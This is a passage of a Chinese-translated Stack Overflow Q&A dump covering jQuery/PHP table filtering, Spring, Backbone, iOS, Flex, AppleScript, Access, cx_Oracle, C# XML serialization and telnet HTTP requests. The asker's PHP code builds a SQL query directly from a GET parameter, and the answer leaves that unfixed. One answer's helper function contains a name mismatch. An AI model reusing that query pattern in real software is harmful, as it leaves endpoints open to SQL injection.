                var credit_totals= row[10];  //get credit_totals
                var not_used= row[11];
                var cleared= row[12];
                var total_uniques= row[13];
                var cleared_each_unique= row[14];
                var total_unique_connect= row[15];
                var cleared_each_unique_connect= row[16];
                var unique_connect_8am_to_8pm= row[17];
                var cleared_each_8am_to_8pm= row[18];
                var calls_over_10= row[19];
                var calls_over_10_pct= row[20];

                //TABLES (ALTERNATING ROWS)
                if (id % 2 == 0)
                {
                    $('#output').append("<tr id=\"evenrow\"> <td>"+id+"</td><td>"+station_network+"</td><td>"+vertical+"</td><td>"+creative+"</td><td>"+tolls+"</td><td>"+states+"</td><td>"+date_range+"</td><td>"+week+"</td><td>"+ordered+"</td><td>"+credits+"</td><td>"+credit_totals+"</td><td>"+not_used+"</td><td>"+cleared+"</td><td>"+total_uniques+"</td><td>"+cleared_each_unique+"</td><td>"+total_unique_connect+"</td><td>"+cleared_each_unique_connect+"</td><td>"+unique_connect_8am_to_8pm+"</td><td>"+cleared_each_8am_to_8pm+"</td><td>"+calls_over_10+"</td><td>"+calls_over_10_pct+"</td></tr>");
                } else {
                    $('#output').append("<tr id=\"oddrow\"> <td>"+id+"</td><td>"+station_network+"</td><td>"+vertical+"</td><td>"+creative+"</td><td>"+tolls+"</td><td>"+states+"</td><td>"+date_range+"</td><td>"+week+"</td><td>"+ordered+"</td><td>"+credits+"</td><td>"+credit_totals+"</td><td>"+not_used+"</td><td>"+cleared+"</td><td>"+total_uniques+"</td><td>"+cleared_each_unique+"</td><td>"+total_unique_connect+"</td><td>"+cleared_each_unique_connect+"</td><td>"+unique_connect_8am_to_8pm+"</td><td>"+cleared_each_8am_to_8pm+"</td><td>"+calls_over_10+"</td><td>"+calls_over_10_pct+"</td></tr>");
                }

            } // End of 'for' loop for the table data

        }  //End of 'do this on success'
    }); //End of AJAX call
  }); //End of Function

function showCreative (creativeVal) 
  {
    //-----------------------------------------------------------------------
    //Send the Creative filter criteria
    //-----------------------------------------------------------------------
    $.ajax({                                      
        url: 'api.php',   //the script to call to get data          
        data: "creative="+creativeVal,   //insert url argumnets here to pass to api.php for example "id=5&parent=6"
        dataType: 'json',   //data format      
        success: function(response) //on recieve of reply     
        { //Do the following on Success   
        alert ("this never fires!");

        } //end of on success
    }); //End Ajax call
}; //End Creative Function  

  </script>
</head>

<body>
  <h2> Media Call Reports </h2>
  <h3>Media Analysis: </h3>
  <div id="instruction">Select how you would like the data selected using the dropdowns below</div>

<!--DROPDOWNS-->
 <div id="dropdowns">

    <div id="creativesel">
    Creative -  
    <select name="creative-select" id="creative-select" onChange ="showCreative(this.value);">
        <option value="all">All</option>
    </select>
    </div> 

    <div id="stationsel">
    Station - 
    <select name="station-select" id="station-select" onChange ="showStation(this.value)">
        <option value="all">All</option>
    </select>
    </div>

     <div id="verticalsel">
    Vertical - 
    <select name="vertical-select" id="vertical-select" onChange ="showVertical(this.value)">
        <option value="all">All</option>
    </select>
    </div>

</div> <!--Dropdowns ending-->

 <!--TABLE BEGINNING - TABLE HEADER ROW--> 
<table id="output">
<tr>
<th>ID</th>
<th>Station_Network</th>
<th>Vertical</th>
<th>Creative</th>
<th>Tolls</th>
<th>States</th>
<th>Date Range</th>
<th>Week</th>
<th>Ordered</th>
<th>Credits</th>
<th>Credits Totals</th>
<th>Not Used</th>
<th>Cleared</th>
<th>Total Uniques</th>
<th>Cleared Each Unique</th>
<th>Total Unique Connect</th>
<th>Cleared Each Unique Connect</th>
<th>Unique Connect 8am - 8pm</th>
<th>Cleared Unique 8am - 8pm</th>
<th>Calls over 10 Min</th>
<th>Calls over 10 Min %</th>
</tr>
</table>

</body>
</html> 
```

我目前在 api.php 中的内容如下所示：

```
<?php 
  //--------------------------------------------------------------------------
  // Connect to DB
  //--------------------------------------------------------------------------
  include 'DB.php';
  $con = mysql_connect($host,$user,$pass) ;
  $dbs = mysql_select_db($databaseName, $con);

  //--------------------------------------------------------------------------
  // Initial Page Load - get data from DB
  //--------------------------------------------------------------------------  
  //Dropdown Filter Function
  function dropdownFilter($filterColumn)
  {
  global $finalarray;
  $filterSQL = "SELECT $filterColumn FROM media_analysis GROUP BY $filterColumn";
  $filterResult = mysql_query($filterSQL);
  $filterColumnData = array();
  while ($filterRow = mysql_fetch_row($filterResult)) 
      {
        $filterColumnData[] = $filterRow;
      }  
    $finalarray[$filterColumn] = $filterColumnData;
  }
    //Dropdown for Stations
    dropdownFilter("STATION_NETWORK");
    //Dropdown for Verticals
    dropdownFilter("VERTICAL");
    //Dropdown for Creative
    dropdownFilter("CREATIVE");

    //Rows of table-data in media-analysis
    $result = mysql_query("SELECT * FROM $tableName");   //Initial Query
    $data = array();
    while ($row = mysql_fetch_row($result) )
        {
        $data[] = $row;
        }   
    $finalarray['rowdata'] = $data;

//----------------------------------------------
//AFTER USER SELECTS FILTERS - IF ANY SELECTED
//----------------------------------------------
  //Get variables from subsequent calls in URL if any
if (isset($_GET['creative']) and !empty($_GET['creative'])) 
    { 
    $creativeFilter = $_GET['creative'];
    echo $creativeFilter;
    $result = mysql_query("SELECT * FROM $tableName WHERE CREATIVE = '$creativeFilter'");   
    $data = array();
    while ($row = mysql_fetch_row($result) )
        {
        $data[] = $row;
        }   
    $finalarray['rowdata'] = $data;
    }
  //--------------------------------------------------------------------------
  // 3) echo result as json 
  //--------------------------------------------------------------------------
  echo json_encode($finalarray);
?> 
```

初始加载工作正常 - 表已创建，下拉选择也是如此。现在我只是想让“创意”下拉菜单起作用（因此我专注于那个）。

当用户从创意下拉列表中选择某些内容时 - 我看到了对 api.php 的 AJAX 调用并带有适当的添加 (api.php?creative="whatever_user_selected") 并且响应返回时包含数组中的所有正确数据（我可以在控制台中看到它） - 但表格永远不会更新。

我需要将代码放在哪里来更新该表？获得更新的最佳方法是什么？

我是这方面的菜鸟，周围有很多教程——每个教程都指定了不同的事情要做——所以我一直在这里寻找但找不到类似的东西。

感谢所有帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T20:27:41.543

我认为您的数据部分应该看起来更像这样：

```
data: { name: "John", location: "Boston" } 
```

或者

```
data: { creative: creativeVal } 
```

# asp.net - 如何在方法 ODataHttpRouteCollectionExtensions.MapODataRoute 中指定命名空间？

> ID：15772326
> 
> 赞同：0
> 
> 时间：2013-04-02T19:08:50.347
> 
> 标签：asp.net, asp.net-web-api, asp.net-web-api-routing

我收到错误消息：“找到了与名为 ... 的控制器匹配的多种类型”并找到了 MapHttpRoute 方法的解决方案。是否可以传递一组命名空间或类似于 MapODataRoute 的东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T01:51:06.630

您应该考虑实现一个新的[IHttpControllerSelector](http://msdn.microsoft.com/en-us/library/system.web.http.dispatcher.ihttpcontrollerselector%28v=vs.108%29.aspx)。您可以扩展[DefaultHttpControllerSelector](http://msdn.microsoft.com/en-us/library/system.web.http.dispatcher.defaulthttpcontrollerselector%28v=vs.108%29.aspx)并覆盖 SelectController 方法，您可以在其中解决不明确的控制器类型并选择您想要的控制器类型。

# java - Web 应用程序的 ApplicationContext 为空

> ID：15772328
> 
> 赞同：1
> 
> 时间：2013-04-02T19:08:54.170
> 
> 标签：java, spring, grizzly

我们正在构建一个 Web 应用程序，`HttpServer`启动后我试图将一些项目从数据库加载到内存中。我知道如何利用服务层的最好方法是使用以下类：

```
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationContextAware;

public class ApplicationContextProvider implements ApplicationContextAware {
    private static ApplicationContext applicationContext;

    public static ApplicationContext getApplicationContext() {
        return applicationContext;
    }

    public void setApplicationContext (ApplicationContext applicationContext) {
        this.applicationContext = applicationContext;
    }
} 
```

它连续为空。

```
public static void main(String[] args) throws IOException {
    final HttpServer server = HttpServer.createSimpleServer(".", 8181);

    WebappContext ctx = new WebappContext("Socket", "/");

    //enable annotation configuration
    ctx.addContextInitParameter("contextClass", "org.springframework.web.context.support.AnnotationConfigWebApplicationContext");
    ctx.addContextInitParameter("contextLocation", "com.production");

    //allow spring to do all of it's stuff
    ctx.addListener("org.springframework.web.context.ContextLoaderListener");

    //serve static assets
    StaticHttpHandler staticHttpHandler = new StaticHttpHandler("src/main/web");
    server.getServerConfiguration().addHttpHandler(staticHttpHandler, "/");

    //deploy
    ctx.deploy(server);

    //NULL
    WorkflowService workflowService = (WorkflowService) ApplicationContextProvider.getApplicationContext().getBean("workflowService");

    server.start(); 
```

服务类带有注释，`@Service`我的配置类是...

```
@Configuration
@ComponentScan(basePackages = {
        "com.production"
})
@PropertySource(value= {
        "classpath:/application.properties",
        "classpath:/environment-${MYAPP_ENVIRONMENT}.properties"
})
@EnableJpaRepositories("com.fettergroup.production.repositories")
@EnableTransactionManagement
public class Config {

    ...

    @Bean
    public ApplicationContextProvider applicationContextProvider() {
        return new ApplicationContextProvider();
    }
} 
```

我相信这个使用灰熊的应用程序`WebContext`是问题的根源。但我不确定该怎么做。我已经做了一些谷歌搜索，看来我使用的解决方案应该可以工作......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T21:47:31.590

`contextLocation`初始化参数应该是`contextConfigLocation`

# javascript - Jquery/Javascript 动画问题

> ID：15772331
> 
> 赞同：0
> 
> 时间：2013-04-02T19:09:11.013
> 
> 标签：javascript, jquery

嗨，我有一个宽度随着 jquery 增加的 div。我想当宽度达到 100% 时做某事

```
$(function() {

  $('.play').click(function() {

    $('.loader').animate({
        width: "100%"
    },1500);
    $('.video img').attr('src','css/images/movie-click.jpg')
    $(this).hide();

    if($('.loader').width()==$('.video img').width()) {

        $('.video img').attr('src','css/images/movie.jpg')
    }

}); 
```

if 语句中的某些内容不正确。如果有人可以帮助我。我的想法是检查 with 是否为 100%，如果是，则一切恢复正常。（播放要显示，宽度 = 0%，img attr 不同。）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:11:42.060

动画完成后，使用`complete`回调 in[`animate`](http://api.jquery.com/animate)执行代码：

```
$('.play').click(function () {
    $('.loader').animate({
        width: "100%"
    }, 1500, function() {
        // any code here will run only after the animation is complete
        $('.video img').attr('src', 'css/images/movie.jpg');   
    });
    // any code here will run as soon as the animation starts,
    // before it's completed
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:11:59.493

click 函数中的代码只调用一次，因此您的 if 语句在动画时不会连续运行。相反，只需在完成后将该逻辑添加到回调中[`.animate()`](http://api.jquery.com/animate/)：

```
$('.loader').animate({
    width: "100%"
},1500,swing, function() {
     $('.video img').attr('src','css/images/movie.jpg');
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T19:18:26.127

> if 语句中的某些内容不正确

确实 :-) 您当前的代码只是比较了两个`.width()`调用返回的 css 值——这当然是错误的。

这不是你等待动画的方式。动画代码是异步的，您的`animate()`调用只是启动动画但立即返回（并继续隐藏按钮并评估条件）。

相反，将回调函数传递给[`animate`](http://api.jquery.com/animate)，它将在动画完成时执行：

```
$(function() {
    $('.play').click(function() {
        $(this).hide();

        var $img = $('.video img');
        $img.attr('src','css/images/movie-click.jpg');

        $('.loader').animate({
            width: "100%"
        }, 1500, function() {
            // executed after the animation
            $img.attr('src','css/images/movie.jpg');
        });
    });
}); 
```

# backbone.js - Backbone.js 动态类型模型类似于java中的T类型

> ID：15772334
> 
> 赞同：1
> 
> 时间：2013-04-02T19:09:27.357
> 
> 标签：backbone.js, backbone.js-collections, backbone-model

我正在根据评论更新我之前的问题，以便更好地理解：

```
//Model's
        Student =  Backbone.Model.extend({
            defaults: {
                name: ''
            }
        });

        Students =  Backbone.Collection.extend({
            model: Student,
            initialize: function(){
            },
            parse: function(resp) {
                return resp;
            }
        });

        Teacher = Backbone.Model.extend({
            defaults : {
                name : '',
                salary : ''
            }
        });   

        Teachers =  Backbone.Collection.extend({
            model: Teacher,
            initialize: function(){
            },
            parse: function(resp) {
                return resp;
            }
        });

        /**
        * I Just need WrapperModel only single class instead of two so that when ever I 
        * make collection of this class I can dynamically bind the 'data' attribute to
        * either Teachers or Students
        */

        WrapperModelStudent = Backbone.Model.extend({
            defaults : {
                message : '',
                processingStatus : ''
            },
            initialize : function() {
                this.data = new Students([new Student({name: "Marry"}),
                                          new Student({name: "Susan"}),
                                          new Student({name: "Samanta"})
                                            ]);
            }
        });

        WrapperModelTeacher = Backbone.Model.extend({
            defaults : {
                message : '',
                processingStatus : ''
            },
            initialize : function() {
                this.data = new Teachers();
            }
        });

        WrapperModelStudents =  Backbone.Collection.extend({
            model: WrapperModelStudent,
            initialize: function(){
            },
            parse: function(resp) {
                return resp;
            }
        });

        WrapperModelTeachers =  Backbone.Collection.extend({
            model: WrapperModelTeacher,
            initialize: function(){             
            },
            parse: function(resp) {
                return resp;
            }
        });

        /**
        *Trying below 
        */
        /***
        * instead of using above two need to just use below one. How to do this??
        */
        WrapperModel = Backbone.Model.extend({
            defaults : {
                message : '',
                processingStatus : ''
            },
            initialize : function(obj) {
                this.data = obj;
            }
        });

        WrapperModelStudentsA =  Backbone.Collection.extend({
            model: WrapperModel(new Students()),
            initialize: function(){
            },
            parse: function(resp) {
                return resp;
            }
        });     
        WrapperModelTeachersB =  Backbone.Collection.extend({
            model: WrapperModel(new Teachers()),
            initialize: function(){             
            },
            parse: function(resp) {
                return resp;
            }
        });

        wrapperModelStudent = new WrapperModelStudent({message:"success",processingStatus:"y"});        
        wrapperModelStudents = new WrapperModelStudents([wrapperModelStudent]);     

        wrapperModelTeacher = new WrapperModelTeacher({message:"success",processingStatus:"y"});
        wrapperModelTeachers = new WrapperModelTeachers([wrapperModelTeacher]);

        wrapperModel = new WrapperModel({message:"success",processingStatus:"y"});      
        wrapperModelStudentsA = new WrapperModelStudentsA([wrapperModel]);      
        wrapperModelTeachersA = new WrapperModelTeachersA([wrapperModel]);

        console.log(wrapperModelStudents);
        console.log(wrapperModelTeachers); 
```

我收到 wrapperModel 的以下错误，我无法创建它的对象。

```
Uncaught TypeError: Object [object global] has no method 'set' 
***************  backbone-min.js:10

g.Model 
***************  backbone-min.js:10

d 
***************  backbone-min.js:38
(anonymous function) sample.html:110 
```

那么有可能在backbone.js中做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T08:11:34.453

我觉得你想多了。Backbone Collection 的模型属性没有多大用处。如果您不获取任何内容，则基本上不需要它们。如果你是，我认为你错过了[Backbone 的文档](http://backbonejs.org/#Collection-model)中的一些内容：
“*一个集合也可以包含多态模型，方法是用一个返回模型的函数覆盖这个属性。* ”

哦，你的错误来自那些行：

```
model: WrapperModel(new Students()), 
```

现在，为什么这项工作不是非常清楚，但需要一些关于 JavaScript 对象//类的知识：*使用类作为函数不会创建对象，因此您的上下文不是类，也不是它的实例*。在这种情况下，*this*将是您的错误读取的全局对象，并且 Backbone 需要一个对象上下文才能正常工作。
你也可以试试`new WrapperModel(new Students())`。你没有错误，但这不起作用。模型属性需要一个类。

tl; dr：您的代码行没有任何意义。

# iphone - 如何检索保存在临时位置的图像

> ID：15772338
> 
> 赞同：0
> 
> 时间：2013-04-02T19:09:37.653
> 
> 标签：iphone, ios, objective-c, xcode

我有一个 iOS 应用程序，其中有一个视图控制器，用户可以在其中访问他们的相机或库来加载图片。我正在尝试创建一个临时副本以加载到另一个视图控制器中的另一个 UIImageView 中。我能够保存文件（至少它在 NSLog 中看起来如此，但我无法访问它以填充第二个视图控制器。

用户加载图像的第一个视图控制器：

```
-(void) imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info {
image = [info objectForKey:UIImagePickerControllerOriginalImage];
[userImageView setImage:image];
[self dismissViewControllerAnimated:YES completion:NULL];

//Save the temp file
tmpDirURL = [NSURL fileURLWithPath:NSTemporaryDirectory() isDirectory:YES];
fileURL = [[tmpDirURL URLByAppendingPathComponent:@"userPic"] URLByAppendingPathExtension:@"jpg"];
NSLog(@"fileURL: %@", [fileURL path]);
} 
```

我的问题是，如何在第二个视图控制器的 viewdidload 中调用保存的文件？

我正在玩这样的东西，但我遇到了错误（我只是希望！）：

```
userImageView.image = _fileURL; 
```

`userImageView`是我设置为我的图像视图的插座。

在第一个控制器的 .h 文件中声明

```
@property (nonatomic, strong) IBOutlet NSURL *fileURL;
@property (nonatomic, strong) IBOutlet NSURL *tmpDirURL; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:21:12.037

您不能只将 NSURL 分配为图像属性。

这将是：

```
userImageView.image = [UIImage imageWithContentsOfFile:[_fileURL absoluteString]]; 
```

此外，看起来您实际上并没有保存文件（除非您在其他地方这样做）。为什么不只保留一个指向被拾取的图像的指针并将指针传递给另一个视图控制器呢？

您已经有一个指向上方 UIImage 的指针

`image = [info objectForKey:UIImagePickerControllerOriginalImage];`.

如果您在第二个视图控制器中创建 UIImage 属性（强），并将其设置为相同的内容，您应该仍然可以使用它。例如，如果您的第二个视图控制器是`mySecondViewController`，并且它有一个名为 的属性`theImageINeed`，您可以执行以下操作：

```
image = [info objectForKey:UIImagePickerControllerOriginalImage];
[userImageView setImage:image];
mySecondViewController.theImageINeed = image; 
```

但是，您似乎正在从需要图像的视图控制器中呈现一个视图控制器。在这种情况下，我会忽略我刚才所说的，并为此创建一个委托方法。

这意味着在您呈现的视图的标题中，您将拥有如下内容：

```
//In the header file of the presented view
@protocol FoundMahImageDelegate <NSObject>
- (void)userSelectedAnImage:(UIImage *)image;
@end

@interface yourViewName : NSObject

//whatever else you already have

@property (nonatomic, strong) id <FoundMahImageDelegate> delegate;
@end 
```

在 .m 文件中：

```
//In the implementation file of the presented view
image = [info objectForKey:UIImagePickerControllerOriginalImage];
[userImageView setImage:image];
[self.delegate userSelectedAnImage:image];  //<-- the part that changed
[self dismissViewControllerAnimated:YES completion:NULL]; 
```

在您的**展示**视图中，您现在必须在头文件中添加协议：

```
@interface myMainViewController : NSObject <FoundMahImageDelegate>
//... 
```

在其实现文件中，添加我们放入协议定义中的方法：

```
- (void)userSelectedAnImage:(UIImage *)image
{
    //here you go, you've got the image, do something with it
} 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-03T09:30:44.383

这很容易尝试以下步骤

1.将所选图像转换为nsdata

2.创建文档目录路径

3.将图像名称附加到文档路径中

3.使用[data writeToFile:imagePath atomically:YES]; 写最后创建的路径。

4.然后无论您想在哪里或任何地方访问文件夹中的图像

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-03T10:35:54.537

不确定，但你可以试试这个

```
userImageView.image =[UIImage imageWithData:[NSData dataWithContentsOfURL:_fileURL]]; 
```

# css - Flex Widgets - 样式的继承

> ID：15772340
> 
> 赞同：0
> 
> 时间：2013-04-02T19:09:44.483
> 
> 标签：css, apache-flex, actionscript, widget, styles

我有一个主应用程序（Flex 4.6），我打算在其中使用任意数量的小部件。小部件是 .swf 文件（s:Module OR s:Application, Flex 4.6）。

**我的问题是加载的小部件不会继承使用它的应用程序的样式。**

简而言之，我将小部件作为 .swf 文件从服务器加载（使用 URLLoader 类）。下载后，我创建了小部件的实例（而单个小部件可以在主应用程序中的多个不同位置包含 - 相乘）。

在主应用程序中，使用了以下 CSS 文件：

```
<fx:Style source="css/common.css" /> 
```

common.css 内容为：

```
s|TextInput {
   contentBackgroundColor: #9FD1F2;
   focusColor: #8FD7F9;
   skinClass: ClassReference("skins.textInputTestSkin");
}

s|Label {
   color: #2211FF;
} 
```

这就是我创建和加载小部件的方式：

```
private var bytesLoader:Loader = null;
public var loadedApp:SystemManager = null;
public var loadedModule:Module = null;

...

bytesLoader.addEventListener(Event.COMPLETE, onBytesLoaderComplete);
var context:LoaderContext = new LoaderContext(false, ApplicationDomain.currentDomain);
bytesLoader.loadBytes(urlLoader.data, context);

...

private function onBytesLoaderComplete(e:Event):void {
   var dataContent:DisplayObject = bytesLoader.content;

   //(Application)
   if(dataContent && (dataContent is SystemManager)) {
      loadedApp = dataContent as SystemManager;
      loadedApp.addEventListener(FlexEvent.APPLICATION_COMPLETE,appWidgetCreationComplete);

      appHolder.addChild(dataContent);
   } else if(dataContent is IFlexModuleFactory) {
      //(Module)
      var moduleLoader:LoaderInfo = LoaderInfo(e.target);
      moduleLoader.content.addEventListener("ready", moduleWidgetReadyHandler);
   }
}

private function moduleWidgetReadyHandler(e:Event):void {
   var factory:IFlexModuleFactory = IFlexModuleFactory(e.target);
   if(factory) {
      loadedModule = factory.create() as Module;

      if(loadedModule) {
         this.addElement(loadedModule);
      }
   }
} 
```

**我的问题是首先，我可以通过什么方式在小部件上应用父母的样式，其次（s：Module），我可以通过什么方式在小部件上应用父母的样式（s：Application） .**

***更新 1***

如果我在每个小部件中更改 getter moduleFactory（如下所示），则样式设置得恰到好处。这意味着小部件（模块和应用程序）中的 textInput 具有与主应用程序中相同的皮肤。

```
override public function get moduleFactory():IFlexModuleFactory {
   return FlexGlobals.topLevelApplication.moduleFactory;
} 
```

**这是解决方法吗？好解决吗？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T08:20:58.977

好的，这是一个解决方案：

*在bytesLoader.loadBytes(urlLoader.data, context);*之前添加

 *```
 //init - moduleFactory
    bytesLoader.contentLoaderInfo.addEventListener(Event.INIT, onContentLoaderInfoInit);

    private function onContentLoaderInfoInit(e:Event):void {
        if(bytesLoader && bytesLoader.contentLoaderInfo) {
            bytesLoader.contentLoaderInfo.removeEventListener(Event.INIT, onContentLoaderInfoInit);
        }

        var loaderInfo:LoaderInfo = LoaderInfo(e.target);
        loaderInfo.content.addEventListener(Request.GET_PARENT_FLEX_MODULE_FACTORY_REQUEST, onGetParentModuleFactoryRequest);
    }

    private function onGetParentModuleFactoryRequest(r:Request):void {
        if(isGlobalStyleAllowed) {
            if ("value" in r) {
                r["value"] = FlexGlobals.topLevelApplication.moduleFactory;
            }
        }

        //remove eventListener
        if(bytesLoader && bytesLoader.contentLoaderInfo) {
            var loaderInfo:LoaderInfo = LoaderInfo(bytesLoader.contentLoaderInfo);
            loaderInfo.content.removeEventListener(Request.GET_PARENT_FLEX_MODULE_FACTORY_REQUEST, onGetParentModuleFactoryRequest);
        }
    } 
```

其作品。*

# applescript - 将数据从 AppleScript 发送到 FileMaker 记录

> ID：15772345
> 
> 赞同：2
> 
> 时间：2013-04-02T19:09:51.200
> 
> 标签：applescript, filemaker

我正在计算 AppleScript 中的一些数据，然后将其插入到特定的 FileMaker 记录中。这是我的 AppleScript：

```
on sendDataToFM(FileNameWithExtension, ClipLength)
    tell application "FileMaker Pro Advanced"

        show every record of database 1
        show (every record whose cell "File Name" = FileNameWithExtension)

        repeat with i from 1 to (count record)
            set MatchingRecord to record i
            set data cell "CLIP LENGTH" of MatchingRecord to ClipLength
        end repeat

    end tell
end sendDataToFM

...

my sendDataToFM('Some Video.mov', '00:01:22.55') 
```

一切正常，***除了***线

```
set data cell "CLIP LENGTH" of MatchingRecord to ClipLength 
```

返回的错误是

```
(*Can’t get cell "CLIP LENGTH" of {"Some Video.mov",  ... }.*) 
```

脚本找到正确的记录，FileMaker 字段名称肯定是“CLIP LENGTH”。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T21:32:51.550

尝试：

```
on sendDataToFM(FileNameWithExtension, ClipLength)
    tell application "FileMaker Pro"
        show (every record of current table whose cell "File Name" = FileNameWithExtension)
        repeat with i from 1 to (count record)
            set cell "CLIP LENGTH" of (record i) to ClipLength
        end repeat
    end tell
end sendDataToFM

my sendDataToFM("Some Video.mov", "00:01:22.55") 
```

# ms-access - 在 Access 中保留单引号

> ID：15772347
> 
> 赞同：0
> 
> 时间：2013-04-02T19:09:54.793
> 
> 标签：ms-access

我在 Access 2010 中创建了一个表单，用于将数据插入到现有表中。该表包含一个关键字字段、源组合框和一个代码文本框，我在其中编写要插入的数据，并且有一个用于执行查询的按钮。表格的代码是：

```
Private Sub cmd_go_Click()
Dim insertstring As String
insertstring = "INSERT INTO KWTable (KW, Source, Code) VALUES('" & text_key.Value & "','" & combo_source.Value & "','" & txt_code.Value & "');"
DoCmd.RunSQL insertstring
End Sub 
```

代码很简单，它将数据输入到表中，以便我可以参考它以备将来使用。现在我遇到的问题是，当我尝试添加我在 SQL Server 中使用的长代码时，我得到一个语法缺失表达式错误，我假设它来自单引号，因为代码来自 SQL。我收到错误是因为当我尝试存储我在 SQL Server 中使用的代码时，它使用访问无法识别的单引号。我想如果我尝试在插入表单的代码中编写一些东西来帮助将单引号转换为双引号，然后将它们重新转换回单引号将有助于解决问题。我只是不知道该怎么做，真的可以使用一些帮助。

谢谢你

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:32:33.857

通过使用参数查询，您可以避免插入文本中包含引号的问题。

考虑这样一种方法`cmd_go_Click()`。

```
Dim strInsert As String
Dim db As DAO.database
Dim qdf As DAO.QueryDef

strInsert = "PARAMETERS pKW TEXT(255), pSource TEXT(255), pCode TEXT(255);" & vbCrLf & _
"INSERT INTO KWTable (KW, Source, Code) VALUES (pKW, pSource, pCode);"
'Debug.Print strInsert
Set db = CurrentDb
Set qdf = db.CreateQueryDef(vbNullString, strInsert)
qdf.Parameters("pKW") = Me.text_key.value
qdf.Parameters("pSource") = Me.combo_source.value
qdf.Parameters("pCode") = Me.txt_code.value
qdf.Execute dbFailOnError
Set qdf = Nothing
Set db = Nothing 
```

但是，我不明白如何`JoinCells()`适应。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-03T17:11:01.687

我使用一个函数来处理空值，并在直接创建 SQL 语句时转义单引号（通过将它们转换为两个单引号）：

```
Function SafeSQL(ByVal pvarSQL As Variant) As String
    SafeSQL2 = Replace(Nz(pvarSQL, ""), "'", "''")
End Function 
```

然后在您的日常工作中，您将拥有：

```
insertstring = "INSERT INTO KWTable (KW, Source, Code) VALUES('" & SafeSQL(text_key.Value) & "','" & SafeSQL(combo_source.Value) & "','" & SafeSQL(txt_code.Value) & "');" 
```

# python - ocx_Oracle ORA-12541 tns 没有监听器

> ID：15772351
> 
> 赞同：6
> 
> 时间：2013-04-02T19:10:30.377
> 
> 标签：python, cx-oracle

我尝试通过 cx_Oracle 连接到远程 oracle 服务器：

db = cx_Oracle.connect('用户名', '密码', dsn_tns)

但它说 databaseError: ORA-12541 tns no listener

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2018-02-09T03:13:53.583

我能够通过 db 客户端（例如 datagrip）进行连接，但是当我从 python 脚本连接时出现 No Listener 错误，因为我的原始连接字符串没有指定端口。我在关注[cx_Oracle 文档](https://oracle.github.io/python-cx_Oracle/)

这篇[文章](https://stackoverflow.com/questions/245465/cx-oracle-connecting-to-oracle-db-remotely)通过以这种方式指定端口来帮助我：

```
ip = '192.168.0.1'
port = 1521
SID = 'YOURSIDHERE'
dsn_tns = cx_Oracle.makedsn(ip, port, SID)

db = cx_Oracle.connect('username', 'password', dsn_tns) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-15T13:15:21.753

如果将 listener.ora 文件（在 Oracle 服务器本身上）配置为侦听“localhost”而不是机器名，则可能会发生此错误。

LISTENER = (DESCRIPTION_LIST = (DESCRIPTION = (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521)) (ADDRESS = (PROTOCOL = TCP)(HOST = ***WN700014*** )(PORT = 1521))))

看到[这个帖子](http://www.mathewweaver.com/2013/08/listenerora-localhost.html)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-10-13T10:51:41.153

就我而言，这是由于我的服务器端口错误：

> ./install_database_new.sh localhost:1511 XE 已满

我将端口更改为“1521”，我可以连接。

# c# - 类未序列化为 XML 文件

> ID：15772353
> 
> 赞同：0
> 
> 时间：2013-04-02T19:10:43.647
> 
> 标签：c#, xml, streamwriter, textwriter

下面的代码不输出流。对我来说看起来正确但不起作用。

```
LineItem i1 = new LineItem() { Id = 1, PartNumber = "abc" };
LineItem i2 = new LineItem() { Id = 2, PartNumber = "def" };
LineItem i3 = new LineItem() { Id = 3, PartNumber = "ghi" };
LineItem i4 = new LineItem() { Id = 4, PartNumber = "jkl" };

List<LineItem> l1 = new List<LineItem>();
l1.Add(i1);
l1.Add(i2);
l1.Add(i3);
l1.Add(i4);

Customer c1 = new Customer() { Id = 1, Company = "MSFT", Name = "John", LineItems = l1 };

XmlSerializer mySerializer = new XmlSerializer(typeof(Customer));
TextWriter myWriter = new StreamWriter(@"XMLFile1.xml");
mySerializer.Serialize(myWriter, c1);
myWriter.Close(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:16:07.170

*   看看你得到的内部异常。它会告诉您在序列化时遇到问题的字段/属性。

*   另外，请记住，序列化的类必须具有默认构造函数。如果你有一个带参数的构造函数，你也需要添加默认的。（没有构造函数很好）

*   XmlSerializer 不会序列化抽象属性，请考虑到这一点

# http - 如何使用 Telnet 发送 HTTP 请求

> ID：15772355
> 
> 赞同：80
> 
> 时间：2013-04-02T19:10:49.143
> 
> 标签：http, web, telnet

[如何使用Telnet](https://en.wikipedia.org/wiki/Telnet)获取网页内容？

例如， 的内容`https://stackoverflow.com/questions`。

* * *

## 回答 #1

> 赞同：100
> 
> 时间：2013-04-02T19:22:51.857

你可以做

```
telnet stackoverflow.com 80 
```

然后粘贴

```
GET /questions HTTP/1.0
Host: stackoverflow.com

# add the 2 empty lines above but not this one 
```

这是一个成绩单

```
$ telnet stackoverflow.com 80
Trying 151.101.65.69...
Connected to stackoverflow.com.
Escape character is '^]'.
GET /questions HTTP/1.0
Host: stackoverflow.com

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
... 
```

* * *

## 回答 #2

> 赞同：57
> 
> 时间：2013-04-02T19:14:16.883

远程登录服务器名称 80

* * *

```
GET /index.html↵
↵ 
```

*↵ 表示“返回”，您需要按两次返回*

